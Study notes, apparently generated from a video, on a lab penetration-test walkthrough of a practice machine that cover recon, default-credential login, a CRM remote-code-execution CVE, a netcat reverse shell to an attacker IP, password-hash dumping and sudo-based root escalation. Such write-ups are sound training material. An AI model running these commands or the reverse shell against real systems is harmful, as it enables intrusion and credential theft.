@@ -1,0 +1,86 @@
+The YouTube video is a walkthrough of a PG-Practice machine named **CTF-200-01 (Crane)**, demonstrating a full penetration test, which is excellent material for OSCP preparation.
+
+Below are comprehensive notes, commands, and key concepts from the walkthrough, structured by the standard penetration testing phases.
+
+***
+
+## 1. Initial Enumeration and Setup
+
+The first step involves scanning the target and preparing the environment with shell variables for efficiency.
+
+| Concept | Command / Note | Timestamp |
+| :--- | :--- | :--- |
+| **Environment Setup** | Set environment variables for the target IP and URL. | [[13:05](http://www.youtube.com/watch?v=AObxyS4RpCc&t=785)] |
+| | `export IP=10.x.x.x` (Target IP) | |
+| | `export URL=http://$IP/` | |
+| **Full Port Scan** | Use `nmap` for a comprehensive scan, including all ports (`-p-`), default scripts (`-sC`), service version detection (`-sV`), and only showing open ports (`--open`). | [[29:30](http://www.youtube.com/watch?v=AObxyS4RpCc&t=1770)] |
+| | `nmap -p- -sC -sV $IP --open` | |
+| **Initial Findings** | **OS:** Debian Linux. **Open Ports:** **22 (SSH)**, **80 (HTTP/Sweet CRM)**, **3306 (MySQL)**, **33060 (MySQL)**. | [[30:46](http://www.youtube.com/watch?v=AObxyS4RpCc&t=1846)] |
+| **MySQL Remote Test** | Test for remote login using default credentials. This failed, indicating the MySQL server only accepts local connections (a security best practice). | [[34:39](http://www.youtube.com/watch?v=AObxyS4RpCc&t=2079)] |
+| | `mysql -h $IP -u root -p` (Leave password blank) | |
+
+***
+
+## 2. Gaining a Foothold (Web Exploitation)
+
+The foothold was achieved by exploiting weak configuration and a known vulnerability in the web application.
+
+### A. Web Enumeration
+
+| Concept | Finding / Command | Timestamp |
+| :--- | :--- | :--- |
+| **Manual Inspection** | Browsing the target on Port 80 revealed **Sweet CRM**. Also found `robots.txt` which did not contain useful secrets. | [[36:38](http://www.youtube.com/watch?v=AObxyS4RpCc&t=2198)] |
+| **Default Credentials** | Tested and found default credentials for Sweet CRM: `admin:admin`. This immediately provided an **authenticated shell** on the web application. | [[43:10](http://www.youtube.com/watch?v=AObxyS4RpCc&t=2590)] |
+| **Version Discovery** | After logging in, the version was found in the Admin -> About section: **Sweet CRM version 7.12.3**. | [[47:08](http://www.youtube.com/watch?v=AObxyS4RpCc&t=2828)] |
+
+### B. Remote Code Execution (RCE)
+
+| Concept | Action / Command | Timestamp |
+| :--- | :--- | :--- |
+| **Exploit Search** | Searching for the version led to **CVE-2022-23940**: Authenticated RCE through Scheduled Reports (affecting up to 7.12.4). | [[49:12](http://www.youtube.com/watch?v=AObxyS4RpCc&t=2952)] |
+| **RCE Verification (Blind)** | Since the exploit was *blind* (it didn't return output), a ping test was used to confirm code execution. | [[54:09](http://www.youtube.com/watch?v=AObxyS4RpCc&t=3249)] |
+| | **Listener:** `sudo tcpdump -i any icmp` | |
+| | **Payload:** `ping -c3 <Attacker IP>` (Confirming packets appeared on the listener proved RCE) | |
+| **Reverse Shell** | Used a Netcat reverse shell payload within the exploit. The user gained a shell as the **www-data** user. | [[55:27](http://www.youtube.com/watch?v=AObxyS4RpCc&t=3327)] |
+| | **Listener:** `nc -lvnp 1990` | |
+| | **Payload:** `nc <Attacker IP> 1990 -e /bin/bash` | |
+
+### C. TTY Shell Stabilization
+
+| Concept | Command Sequence | Timestamp |
+| :--- | :--- | :--- |
+| **TTY Upgrade** | Commands used to spawn a proper, interactive TTY shell (essential for text-based tools like `vi` and clean terminal output). | [[56:05](http://www.youtube.com/watch?v=AObxyS4RpCc&t=3365)] |
+| | 1. `python3 -c 'import pty; pty.spawn("/bin/bash")'` | |
+| | 2. `export TERM=xterm` | |
+| | 3. **<Ctrl+Z>** (To background the shell) | |
+| | 4. `stty raw -echo; fg` (To regain the shell and fix input/output) | |
+| | 5. `reset` (Optional, for visual cleanup) | |
+
+***
+
+## 3. Privilege Escalation to Root
+
+The final stage involved escalating privileges from the low-privilege `www-data` user to the `root` user.
+
+### A. Post-Exploitation Enumeration
+
+| Concept | Command / Finding | Timestamp |
+| :--- | :--- | :--- |
+| **Internal MySQL Access** | Since the MySQL server was configured to only accept local connections, the `www-data` user (being local) could log in as `root` without a password. | [[58:44](http://www.youtube.com/watch?v=AObxyS4RpCc&t=3524)] |
+| | `mysql -u root -p` (Enter) | |
+| **Data Exfiltration** | Accessed the `sweetcrm` database and dumped user credentials. | [[59:33](http://www.youtube.com/watch?v=AObxyS4RpCc&t=3573)] |
+| | `use sweetcrm;` | |
+| | `select user_name, password from users;` (Hashes exfiltrated for potential offline cracking) | |
+| **Checking `sudo`** | This is the most crucial step for privilege escalation. Found a critical misconfiguration. | [[01:04:01](http://www.youtube.com/watch?v=AObxyS4RpCc&t=3841)] |
+| | `sudo -l` | |
+
+### B. The Exploit (Sudo Misconfiguration)
+
+| Concept | Finding / Escalation Command | Timestamp |
+| :--- | :--- | :--- |
+| **Vulnerability** | The `www-data` user was allowed to run the `/usr/sbin/service` binary as **root** without a password: `(root) NOPASSWD: /usr/sbin/service`. | [[01:04:01](http://www.youtube.com/watch?v=AObxyS4RpCc&t=3841)] |
+| **Root Shell** | Exploited the misconfiguration using directory traversal to execute `/bin/bash` with root privileges. This is a common technique found on **GTFOBins**. | [[01:05:07](http://www.youtube.com/watch?v=AObxyS4RpCc&t=3907)] |
+| | `sudo /usr/sbin/service ../../bin/bash` | |
+
+The above command successfully spawned a **root shell (`#`)** on the machine.
+http://googleusercontent.com/youtube_content/0
